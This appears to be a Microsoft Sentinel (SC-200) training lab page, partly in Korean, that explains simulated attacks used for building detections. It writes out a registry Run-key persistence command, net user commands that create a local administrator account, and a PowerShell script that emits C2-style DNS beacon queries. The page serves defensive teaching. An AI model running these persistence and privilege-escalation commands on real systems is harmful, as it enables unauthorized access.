---
lab:
  title: 연습 5 - 검색 모델링 이해
  module: Module 7 - Create detections and perform investigations using Microsoft Sentinel
---

# <a name="module-7---lab-1---exercise-5---understand-detection-modeling"></a>모듈 7 - 랩 1 - 연습 5 - 검색 모델링 이해

![랩 개요입니다.](../Media/SC-200-Lab_Diagrams_Mod7_L1_Ex4.png)
### <a name="task-1-understand-the-attacks"></a>작업 1: 공격 이해

><bpt id="p1">**</bpt>Important: You will perform no actions in this exercise.<ept id="p1">**</ept>  These instructions are only an explanation of the attacks you will perform in the next exercise. Please carefully read this page.

공격 패턴은 오픈 소스 프로젝트(https://github.com/redcanaryco/atomic-red-team )를 기반으로 합니다.


#### <a name="attack-1---persistence-with-registry-key-add"></a>공격 1 - 레지스트리 키 추가를 통한 지속성

Attackers will add a program in the Run Registry key. This achieves persistence by making the program run every time the user logs on.

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

#### <a name="attack-2---user-add-and-elevate-privilege"></a>공격 2 - 사용자 추가 및 권한 상승

Attackers will add new users and elevate the new user to the Administrators group. This enables the attacker to logon with a different account that is privileged.

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

#### <a name="attack-3---dns--c2"></a>공격 3 - DNS/C2 

Attacker will send a large volume of DNS queries to a command and control (C2) server. The intent is to trigger threshold-based detection on the number of DNS queries either from a single source system or to a single target domain.

```
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```


### <a name="task-2-understand-detection-modeling"></a>작업 2: 탐지 모델 이해

이 랩에서 사용하는 공격 검색 구성 주기에는 모든 데이터 원본이 포함됩니다. 하지만 실제로는 두 가지 데이터 원본만 중점적으로 검색합니다.

To build a detection, you first start with building a KQL statement. Since you will attack a host, you will have representative data to start building the KQL statement.


KQL 문을 완성한 후에는 분석 규칙을 만듭니다.

규칙이 트리거되어 경고와 인시던트가 생성되면 조사를 진행하여 보안 운영 분석자의 조사 과정에 도움이 되는 필드가 제공되고 있는지를 확인합니다.

다음으로, 분석 규칙에 다른 변경을 적용합니다.

>**참고:** 일부 경고는 이 랩의 목적에 따라 더 짧은 기간에 트리거됩니다.

## <a name="proceed-to-exercise-6"></a>연습 6 계속 진행
